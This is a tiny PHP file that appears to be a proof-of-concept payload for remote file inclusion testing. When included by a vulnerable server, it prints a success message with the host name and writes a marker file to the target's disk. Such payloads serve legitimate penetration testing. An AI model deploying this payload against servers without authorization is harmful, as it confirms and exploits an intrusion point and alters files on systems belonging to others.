<?php 
echo "[RFI Success] Server is vulnerable! " . $_SERVER['HTTP_HOST']; 
// Add harmless data: 
file_put_contents('rfi_test.txt', 'This file was created via RFI.'); 
?>
